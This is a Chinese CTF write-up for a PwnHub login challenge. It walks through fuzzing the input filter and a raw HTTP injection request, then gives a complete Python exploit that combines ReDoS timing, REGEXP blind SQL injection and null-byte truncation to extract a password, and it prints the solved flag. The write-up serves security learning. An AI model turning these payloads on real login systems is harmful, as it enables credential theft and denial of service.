---
title: "pwnhub：内部赛【一起来拆盲盒-So_That_Login】WP"
slug: pwnhub-regexp-sqli
translationKey: pwnhub-regexp-sqli
date: 2021-10-21T14:06:49+08:00
source: yuque/penetration
---

# 题目本身
没有任何回显，先后尝试了用`ffuf`、Burp来FUZZ，   

```python
./ffuf -w /opt/dic/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt -u  http://121.40.89.206:8088/index.php   -d "username=FUZZ&passwd="
```

全程只有两种响应（均为200）

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1634796770549-a3b9dd94-3bc5-42e8-97e7-6770fff883e7.png)

**1）检测到违规关键字时：**

+ 返回`alert('No,way! hacker!');`
+ Content-Length: `42`

**2）代入了SQL查询时：**

+ 返回首页的内容
+ Content-Length: `2175`

一并附上SQL的Fuzz字典，[https://github.com/H4lo/dictionary/blob/master/sql_fuzz.txt](https://github.com/H4lo/dictionary/blob/master/sql_fuzz.txt)

所以用各种SQL关键字FUZZ，确定出允许使用的如下字符：

```python
from       
schema     
(      
)      
*      
/      
!      
^      
*      
_      
+      
/**/       
||     
regexp     
&      
|      
hex    
updatexml      
extractvalue       
update     
delete     
user       
version    
ascii      
group      
reverse    
left       
right      
é    
true       
length     
false      
load_file      
```

# 思路
因为不善于找“SQL极限盲注”，所以简单FUZZ后暂搁置，后来主办方给了提示

```python
更新
2021.10.21 10:28:10【提示】mysql regexp 匹配注入你真的会吗？
```

一番OSINT，发现了一道类似的题：[REGEXP注入与LIKE注入学习笔记 - 先知社区](https://xz.aliyun.com/t/8003#toc-7)

**（1）禁了单引号**`**'**`，可以用上文中的`反斜杠\`来形成SQL注入

思考：如果不能逃逸出单引号，所有的输入都只是字符串，注入根本无从谈起——必须让输入从单引号中逃逸出现（且不引入新的单引号）



**（2）禁了注释符号**`**--**`**、**`**#**`

思考：如果不用注释符号，那么也可以通过添加引号，使之符合SQL语法，如`||'`'，但由于单引号被禁，此路不通。



<font style="color:#F5222D;">翻阅师傅们的解题脚本，居然是用的</font>`<font style="color:#F5222D;">\x00</font>`<font style="color:#F5222D;">来截断，我真的惊了。</font>



## 事后的一点小机灵
+ 为什么给的密码字段名是`passwd`，而非`password`——少了个`or`，很可能是因为最后的解法中会用到`or`，不便于开展，所以去掉了。





# EXP
`--` / `#` 都被ban掉了，不知如何闭合最后的单引号，目前只能做到这一步：

```python
POST /index.php HTTP/1.1
Host: 121.40.89.206:8088
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://121.40.89.206:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://121.40.89.206:8088/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=\&passwd=||passwd/**/regexp/**/0x5e41/**/||/**/'
```

最终的EXP

```python
import requests

burp0_url = "http://121.40.89.206:8088/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://121.40.89.206:8088", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://121.40.89.206:8088/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
proxy = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}


# ReDoS配置
num = 30000  # Response time ~= 3s  <- r.elapsed
PADDING = "a"*num
REGEX = "(a*b*)"*num + "b"
sleep_clause = '("%s")REGEXP("%s")' % (PADDING, REGEX)


result = ''
charSets = "abcdefghijklmnopqrstuvwxyz0123456789-_"
condition = 'passwd/**/REGEXP/**/("^{tpl}")'
for i in range(64):
    for c in charSets:
        payload = '||CASE/**/WHEN/**/{condition}/**/THEN/**/{sleep_clause}/**/ELSE/**/1/**/END;\x00'.format(condition=condition.format(tpl=str(result + c)), sleep_clause=sleep_clause)
        burp0_data = {"username": "a\\", "passwd": payload}
        try:
            r = requests.post(burp0_url, proxies=proxy, data=burp0_data, timeout=2)
        except requests.exceptions.RequestException:
        # boolean true
            result += c
            print(result)
            break

print(result)
# the_p0ssw0rd_th0t_y0u_never_kn0w
```



ReDoS延时+SQL盲注+`\x00`截断+拉丁字母绕过关键词检测

+ null-byte truncation
+ unsafe normalize



# Refs
+ [MySQL/8.0/en/regexp.html#operator_regexp](https://dev.mysql.com/doc/refman/8.0/en/regexp.html#operator_regexp)
+ [REGEXP注入与LIKE注入学习笔记 - 先知社区](https://xz.aliyun.com/t/8003#toc-7)
+ [https://www.exploit-db.com/docs/english/17397-blind-sql-injection-with-regular-expressions-attack.pdf](https://www.exploit-db.com/docs/english/17397-blind-sql-injection-with-regular-expressions-attack.pdf)
+ ReDoS：[https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
+ [http://www.unicode.org/reports/tr36/](http://www.unicode.org/reports/tr36/)

